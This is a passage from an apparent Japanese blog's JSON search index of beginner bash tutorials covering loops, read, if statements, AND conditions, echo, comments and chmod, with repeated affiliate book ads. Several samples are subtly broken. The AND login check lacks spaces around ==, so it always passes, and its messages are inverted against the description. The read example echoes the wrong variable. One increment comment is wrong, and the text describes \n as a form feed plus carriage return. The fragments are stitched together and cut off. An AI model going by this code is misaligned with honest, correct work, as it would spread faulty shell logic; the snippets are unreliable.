4 3 2 1 $ ヒント 以下、どの記法も同じ。書きやすいものを選べばいい。 # 冗長 for i in \\`seq 10\\` do echo \u0026#34;test\u0026#34; done # 簡素 for i in \\`seq 10\\`;do echo \u0026#34;test\u0026#34; done # C/Javaライク for((i=0;i\u0026lt;10;i++));do echo \u0026#34;test\u0026#34; done 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-07T10:03:12+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-06-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-06-suzuki/","title":"【６．for ループ】ざっくりわかる「シェルスクリプト」"},{"content":"対話型入力 ユーザー入力の取得\n\u0026lsquo;read\u0026rsquo;コマンドは、bashでユーザーから入力を受け取るために使用されます。\n\u0026lsquo;user_input.sh\u0026rsquo;という名前のファイルを作成し、ユーザーから入力を取得するための次のスクリプトを追加します。\nここでは、1つの文字列値がユーザーから取得され、他の文字列値を組み合わせて値が表示されます。\n#!/bin/bash echo \u0026#34;あなたの名前を入力して下さい\u0026#34; read name echo \u0026#34;ようこそ $name. ＮＬＰへ\u0026#34; bashコマンドでファイルを実行します。\n$ bash user_input.sh あなたの名前を入力して下さい suzuki ようこそ suzuki。 ＮＬＰへ $ ヒント 以下のソースは read コマンドの手前でechoすらしない -p オプションだ。 read -p \u0026ldquo;INPUT:\u0026rdquo; str\necho $str1 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-07T10:03:12+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-07-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-07-suzuki/","title":"【７．対話型入力】ざっくりわかる「シェルスクリプト」"},{"content":"if 文 if文を使う\n単数、または複数の条件でif条件を使用できます。\nこのステートメントの開始ブロックと終了ブロックは、「if」と「fi」で定義されます。\n「simple_if.sh」という名前のファイルを作成し、bashでのifステートメントの使用を確認します。\nここでは、変数nに10が割り当てられています。\n$nの値が10未満の場合、出力は「1桁の数値です」になります。\nそれ以外の場合、出力は「2桁の数値です」になります。\n比較のために、ここでは「-lt」を使用しています。\nオプション意味 -eq同　じ（==） -lt小さい（＜） -gt大きい（＞） #!/bin/bash n=10; if [ $n -lt 10 ];then echo \u0026#34;1桁の数値です\u0026#34;; else echo \u0026#34;2桁の数値です\u0026#34;; fi bashコマンドでファイルを実行します。\n$ bash simple_if.sh 2桁の数値です $ ヒント 数値を比較する場合は、「\u0026lt;」「\u0026gt;」「=」ではなく、 -eq -lt -gt を使う必要があります。 文字列を比較する場合は 「==」または 「!=」を使います。\n書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-07T10:03:12+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-08-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-08-suzuki/","title":"【８．If 文】ざっくりわかる「シェルスクリプト」"},{"content":"and 条件を if 文で使う ANDロジックでifステートメントを使用する：\n2つ以上の条件を持つifステートメントでは、さまざまなタイプの論理条件を使用できます。\nandロジックを使用してifステートメントで複数の条件を定義する方法を次の例に示します。\n\u0026lsquo;\u0026amp;\u0026amp;\u0026lsquo;は、ifステートメントのandロジックを適用するために使用されます。\n\u0026lsquo;if_with_and.sh\u0026rsquo;という名前のファイルを作成して、次のコードを確認します。\nここで、ユーザー名とパスワードの変数の値はユーザーから取得され、「admin」および「secret」と比較されます。\n両方の値が一致する場合、出力は「有効なユーザー」になります。一致しない場合、出力は「無効なユーザー」になります。\n数値を比較する場合は、「\u003c」「\u003e」「=」ではなく、 -eq -lt -gt を使う必要があります。 文字列を比較する場合は 「==」または 「!=」を使います。 #!/bin/bash echo \u0026#34;名前を入力して下さい\u0026#34; read username echo \u0026#34;パスワードを入力して下さい\u0026#34; read password if [[ (\u0026#34;$username\u0026#34;==\u0026#34;admin\u0026#34; \u0026amp;\u0026amp; \u0026#34;$password\u0026#34;==\u0026#34;secret\u0026#34;) ]];then echo \u0026#34;無効なユーザーです\u0026#34;; else echo \u0026#34;有効なユーザーです\u0026#34;; fi bashコマンドでファイルを実行します。\n$ bash if_with_and.sh 名前を入力して下さい suzuki パスワードを入力して下さい password 無効なユーザーです $ ヒント 数値を比較する場合は、「\u0026lt;」「\u0026gt;」「=」ではなく、 -eq -lt -gt を使う必要があります。 文字列を比較する場合は 「==」または 「!=」を使います。\n書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-07T10:03:12+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-14-09-suzuki/shellscript_hu5909208fb16d2109d0cdca2186f9358e_31961_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-14-09-suzuki/","title":"【９．and 条件を if 文で使う】ざっくりわかる「シェルスクリプト」"},{"content":"はじめに Bashスクリプトは、シェルコマンドの実行、複数のコマンドの同時実行、管理タスクのカスタマイズ、タスクの自動化の実行など、さまざまな目的に使用できます。したがって、bashプログラミングの基本に関する知識はすべてのLinuxユーザーにとって重要です。この記事は、bashプログラミングの基本的な考え方を理解するのに役立ちます。ここでは、bashスクリプトの一般的な操作のほとんどを、非常に簡単な例で説明します。\nこの記事では、bashプログラミングの次のトピックについて説明します。\nHello World はじめてのbashコマンド「echo」\nターミナルで非常に単純なbashステートメントを実行します。 コマンドの出力は「Hello, World」になります。\n$ echo \u0026#34;Hello, World\u0026#34; Hello, World $ はじめてのbashスクリプト「vim」\n$ vim HelloWorld.sh ＜空のvim HelloWorld.sh が開きます＞ vimで開いたHelloWorld.shを編集します。\n#!/bin/bash echo \u0026#34;Hello World\u0026#34;; はじめての実行権限「chmod」\nbashファイルは2つの方法で実行できます。\n１．bashコマンドを使用する方法、\n２．bashファイルに実行権限を設定し、ファイルを実行する方法\n一つ目の方法「bashコマンドを使用する」\n$ bash HelloWorld.sh もう一つの方法「chmodで実行権限を付与する」\n# +x で実行権限を付与 $ chmod +x HelloWorld.sh # ドット　スラッシュをつけて実行 $ ./HelloWorld.sh ヒント $ ./ でファイルを実行する場合、ソースファイルの先頭行に記載されている #!/bin/bash\nという記述をつかって実行されます。\n$ ./\u0026lt;ファイル名\u0026gt;\nで実行した場合は、bashコマンド（/bin/bash )を使って実行することを、ソースファイルの先頭で宣言している。という事になります。\nこのソースファイルの1行目の記述を「シェバン」と言います。 /usr/local/bin/awk\nにあるコマンドを使ってソースファイルを実行( ./\u0026lt;ファイル名\u0026gt;）したい場合は、ソースファイルの先頭行に\n#!/usr/local/bin/awk\nと、記述します。\n考え方ですが、bashコマンドで実行する場合のメリットは、ファイルに闇雲に実行権限を与える必要がないことです。実行権限を与える方法は、一般的ではありますが注意も必要です。\nchmod の実行権限には +x で実行権限を付与する方法の他、0755 などの数字で付与する場合もあります。\nこれらをパーミッションと言います。\nヒント 考え方ですが、bashコマンドでファイルを実行する場合のメリットは、ファイルに実行権限をやみくもに与える必要がないことです。 同時に、第三者が簡単にファイルを実行できる事を防ぐ、自分自身が誤ってファイルを実行してしまうというケアレスミスを防ぐことができます。 実行権限を与える方法は、一般的ではありますが、注意も必要です。 パーミッションの確認\nターミナルのコマンドでカレントディレクトリ内のファイルやディレクトリの情報を確認します。\n$ls -l 上記のコマンドを実行すると、以下のような一覧が表示されるかと思います。\n-rw-r--r-- 1 user group 9 1月 1 00:00 hoge.txt drwxr-xr-x 6 user group 20480 1月 1 00:00 ダウンロード パーミッションの読み方\n「-rw-r\u0026ndash;r\u0026ndash;」や「drwxr-xr-x」の先頭の謎の10文字についてですが、\n最初の１文字目はファイル種別を表しています。\n-rw-r\u0026ndash;r\u0026ndash;\n種別意味 -ファイル dディレクトリ lシンボリックリンク 2文字目から4文字目はファイルの所有者に対する権限を表し、\n5文字目から7文字目はファイルの所有グループに対する権限を表し、\n8文字目から10文字目はその他に対する権限を表しています\n上記から-rw-r\u0026ndash;r\u0026ndash;は、\n「ファイル種別」が「ファイル」であり、\n「所有者」に「読み取り」と「書き込み」の権限があり、\n「所有グループ」に「読み取り」の権限があり、\n「その他」に「読み取り」の権限があることを示しています。\ndrwxr-xr-xは、\n「ファイル種別」が「ディレクトリ」であり、\n「所有者」に「読み取り」と「書き込み」と「実行」の権限があり、\n「所有グループ」に「読み取り」と「実行」の権限があり、\n「その他」に「読み取り」と「実行」の権限があることを示しています。\nアクセス権限の変更\nアクセス権限を変更する方法について記載します。\nパーミッションの変更には chmodコマンドを使用します。\n数値で指定する\n$ ls -l　-rw-r--r-- 1 user group 9 1月 1 00:00 hoge.txt $ chmod 764 hoge.txt $ ls -l -rwxrw-r-- 1 user group 9 1月 1 00:00 hoge.txt 上記のコマンドはhoge.txtに対してパーミッションの確認→変更→確認を行っています。\n$ chmod 764 hoge.txt に関して説明していきます。\nファイルのパーミッションの変更は以下の通りコマンドを実行すれば可能です。\nchmod モード 対象ファイル名 モードの数字について\nモード(数字)モード(アルファベット)権限 4r読み取り 2w書き込み 1x実行 上記の合計値を「所有者」「所有グループ」「その他」の順で入力することでパーミッションを変更することができます。 要するに上記の「764」は 「所有者」に対して「読み取り」「書き込み」「実行」を、 「所有グループ」に対して「読み取り」「書き込み」を、 「その他」に「読み取り」を付与しています。 ヒント 実行したい場合は $ chmod 755 \u0026lt;ファイル名\u0026gt; 読み取りのみを許可し、実行しない場合は $ chmod 644 \u0026lt;ファイル名\u0026gt; 自分だけの読み取りを許可する場合は $ chmod 600 \u0026lt;ファイル名\u0026gt; 通常は上記３種類しか使いません。 CGI などを使う場合は $ chown や $chgrp を組み合わせて使うことが多いです。 $ chmod 777 \u0026lt;ファイル名\u0026gt; というパーミッションを軽率に与えず、上手にコマンドを使いこなすことがセキュリティにつながります。 詳しくはこちら\nhttps://qiita.com/shisama/items/5f4c4fa768642aad9e06\necho コマンド echoコマンドの使用：\nさまざまなオプションでechoコマンドを使用できます。\n次の例では、いくつかの便利なオプションについて説明します。\nオプションなしで「echo」コマンドを使用すると、デフォルトで改行が追加されます。\n\u0026lsquo;-n\u0026rsquo;オプションは、改行なしでテキストを印刷するために使用され、\u0026rsquo;-e\u0026rsquo;オプションは、出力からバックスラッシュ文字を削除するために使用されます。\n\u0026rsquo;echo_example.sh\u0026rsquo;という名前の新しいbashファイルを作成し、次のスクリプトを追加します。\n#!/bin/bash echo \u0026#34;改行付きのテキストの印刷\u0026#34;; echo -n \u0026#34;改行なしのテキストの印刷\u0026#34;; echo -e \u0026#34;\\n削除\\tバックスラッシュ\\t文字\\n\u0026#34;; bashコマンドでファイルを実行します。\n$ bash echo_example.sh 改行付きのテキストの印刷 改行なしのテキストの印刷 削除\tバックスラッシュ\t文字 $ ヒント echo の利用例は果てしない。ここで説明してもだれも読みはしないだろう。なので、概要の抜粋を説明する echo でよく使われるオプションは以下の通り\nオプション\t意味\n-n\t最後の改行を出力しない -e\tエスケープシーケンスを解釈する -E\tエスケープシーケンスを解釈しない（デフォルト） エスケープシーケンスとは、上記のバックスラッシュのことだ。\n以下の4つを覚えておくだけでおおよそは事足りる。 オプション 意味\n\\r\tキャリッジリターン \\n\t改行（フォームフィード＋キャリッジリターン） \\t\t水平タブ \\\tバックスラッシュ コメント コメントの使用\n「#」記号は、bashスクリプトに1行コメントを追加するために使用されます。\n\u0026lsquo;comment_example.sh\u0026rsquo;という名前の新しいファイルを作成し、1行コメント付きの次のスクリプトを追加します。\n#!/bin/bash #2つの数値をsumに追加します ((sum=25+35)); #結果を出力します echo \u0026#34;$sum\u0026#34;; bashコマンドでファイルを実行します。\n$ bash comment_example.sh 60 $ ヒント 複数行コメントに関しては次の章で説明します。 マルチラインコメント 複数行コメントの使用\nbashではさまざまな方法で複数行コメントを使用できます。\n次の例に簡単な方法を示します。\n\u0026lsquo;multiline-comment.sh\u0026rsquo;という名前の新しいbashを作成し、次のスクリプトを追加します。\nここでは、「:」と「\u0026rsquo;」でbashで複数行コメントを実現しています。\n次のスクリプトは、5の2乗を計算します。\nヒント 「:」と「\u0026rsquo;」の間は半角スペースを入れます。 #!/bin/bash : \u0026#39; 次のスクリプトは、 数値の2乗値5を計算します。 \u0026#39; ((area=5*5)); echo \u0026#34;$area\u0026#34;; bashコマンドでファイルを実行します。\n$ bash multiline-comment.sh 25 $ ヒント 多くの場合、マルチラインコメントの存在は知られていない。 ほとんどの人は、行頭に「#」をならべて複数行コメントを行う。 それは、過去のメジャーソースコードの冒頭にそうあるからだ。 そう、UNIX/Linuxの開発者のほとんどは、マルチラインコメントを知らないのだ。 今後出てくるであろうファイルの生成に「touch」というコマンドがある。これ実は 「:\u0026gt;ファイル名」で、空のファイルを生成する事ができる。「:」は、”なにもしないことを示す。if文の中で何もしない場合は、以下のように記述する。\nif [ \u0026ldquo;$v\u0026rdquo; -eq 5 ];then\n: # 何もしない fi touchは既にファイルがあれば、そのファイルにはさわらない。\n:\u0026gt; は既にファイルがあれば、そのファイルさえも空にする。 上記 if 文の中の : は　何もしないことを示す。 マルチラインコメントも同じ「:」から始まり、何もしないことを示している。 while ループ whileループの使用\nwhileループの使用法を知るために、「while_example.sh」という名前のbashファイルを作成します。\nこの例では、whileループが5回繰り返されます。\ncount変数の値は、各ステップで1ずつ増加します。\ncount変数の値が5になると、whileループは終了します。\n#!/bin/bash valid=true; count=1 while [ \u0026#34;$valid\u0026#34; ];do echo \u0026#34;$count\u0026#34;; if [ \u0026#34;$count\u0026#34; -eq 5 ];then break; fi ((count++)); done bashコマンドでファイルを実行します。\n$ bash while_example.sh 1 2 3 4 5 $ ヒント 上記ソースでトリッキーなのはwhileよりもむしろ ((COUNT++))\nだろう。\nCOUNT = COUNT + 1; count=1\ncount=$(expr $count + 1) # =\u0026gt; 2 let ++count # =\u0026gt; 2 let count++ # =\u0026gt; 3 count=$((++count)) # =\u0026gt; 2 count=$((count++)) # =\u0026gt; 2 count=$((count += 1)) # =\u0026gt; 3 変数に代入する必要がないから $(( )) ではなく、\n(( )) でよい。(( )) の中の変数を表す「$」は記述の必要はない for ループ forループの使用\n基本的なforループ宣言を示します。\n\u0026lsquo;for_example.sh\u0026rsquo;という名前のファイルを作成し、forループを使用して、次のスクリプトを追加します。\nここでは、forループは10回繰り返され、変数のすべての値、counterを1行で出力します。\n#!/bin/bash for((counter=10;counter\u0026gt;0;counter--));do echo -n \u0026#34;$counter \u0026#34;; done printf \u0026#34;\\n\u0026#34; bashコマンドでファイルを実行します。\n$ bash for_example.sh 10 9 8 7 6 5 4 3 2 1 $ ヒント 以下、どの記法も同じ。書きやすいものを選べばいい。 # 冗長 for i in \\`seq 10\\` do echo \u0026#34;test\u0026#34; done # 簡素 for i in \\`seq 10\\`;do echo \u0026#34;test\u0026#34; done # C/Javaライク for((i=0;i\u0026lt;10;i++));do echo \u0026#34;test\u0026#34; done 対話型入力 ユーザー入力の取得\n\u0026lsquo;read\u0026rsquo;コマンドは、bashでユーザーから入力を受け取るために使用されます。\n\u0026lsquo;user_input.sh\u0026rsquo;という名前のファイルを作成し、ユーザーから入力を取得するための次のスクリプトを追加します。\nここでは、1つの文字列値がユーザーから取得され、他の文字列値を組み合わせて値が表示されます。\n#!/bin/bash echo \u0026#34;あなたの名前を入力して下さい\u0026#34; read name echo \u0026#34;ようこそ $name. ＮＬＰへ\u0026#34; bashコマンドでファイルを実行します。\n$ bash user_input.sh あなたの名前を入力して下さい suzuki ようこそ suzuki。 ＮＬＰへ $ ヒント 以下のソースは read コマンドの手前でechoすらしない -p オプションだ。 read -p \u0026ldquo;INPUT:\u0026rdquo; str\necho $str1 If 文 if文を使う\n単数、または複数の条件でif条件を使用できます。\nこのステートメントの開始ブロックと終了ブロックは、「if」と「fi」で定義されます。\n「simple_if.sh」という名前のファイルを作成し、bashでのifステートメントの使用を確認します。\nここでは、変数nに10が割り当てられています。\n$nの値が10未満の場合、出力は「1桁の数値です」になります。\nそれ以外の場合、出力は「2桁の数値です」になります。\n比較のために、ここでは「-lt」を使用しています。\nオプション意味 -eq同　じ（==） -lt小さい（＜） -gt大きい（＞） 数値を比較する場合は、「\u0026lt;」「\u0026gt;」「=」ではなく、\n-eq -lt -gt を使う必要があります。\n文字列を比較する場合は 「==」または 「!=」を使います。\n#!/bin/bash n=10; if [ $n -lt 10 ];then echo \u0026#34;1桁の数値です\u0026#34;; else echo \u0026#34;2桁の数値です\u0026#34;; fi bashコマンドでファイルを実行します。\n$ bash simple_if.sh 2桁の数値です $ ヒント 数値を比較する場合は、「\u0026lt;」「\u0026gt;」「=」ではなく、 -eq -lt -gt を使う必要があります。 文字列を比較する場合は 「==」または 「!=」を使います。\nand 条件を if 文で使う ANDロジックでifステートメントを使用する：\n2つ以上の条件を持つifステートメントでは、さまざまなタイプの論理条件を使用できます。\nandロジックを使用してifステートメントで複数の条件を定義する方法を次の例に示します。\n\u0026lsquo;\u0026amp;\u0026amp;\u0026lsquo;は、ifステートメントのandロジックを適用するために使用されます。\n\u0026lsquo;if_with_and.sh\u0026rsquo;という名前のファイルを作成して、次のコードを確認します。\nここで、ユーザー名とパスワードの変数の値はユーザーから取得され、「admin」および「secret」と比較されます。\n両方の値が一致する場合、出力は「有効なユーザー」になります。一致しない場合、出力は「無効なユーザー」になります。\n数値を比較する場合は、「\u003c」「\u003e」「=」ではなく、 -eq -lt -gt を使う必要があります。 文字列を比較する場合は 「==」または 「!=」を使います。 #!/bin/bash echo \u0026#34;名前を入力して下さい\u0026#34; read username echo \u0026#34;パスワードを入力して下さい\u0026#34; read password if [[ (\u0026#34;$username\u0026#34;==\u0026#34;admin\u0026#34; \u0026amp;\u0026amp; \u0026#34;$password\u0026#34;==\u0026#34;secret\u0026#34;) ]];then echo \u0026#34;無効なユーザーです\u0026#34;; else echo \u0026#34;有効なユーザーです\u0026#34;; fi bashコマンドでファイルを実行します。\n$ bash if_with_and.sh 名前を入力して下さい suzuki パスワードを入力して下さい password 無効なユーザーです $ ヒント 数値を比較する場合は、「\u0026lt;」「\u0026gt;」「=」ではなく、 -eq -lt -gt を使う必要があります。 文字列を比較する場合は 「==」または 「!=」を使います。\n書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 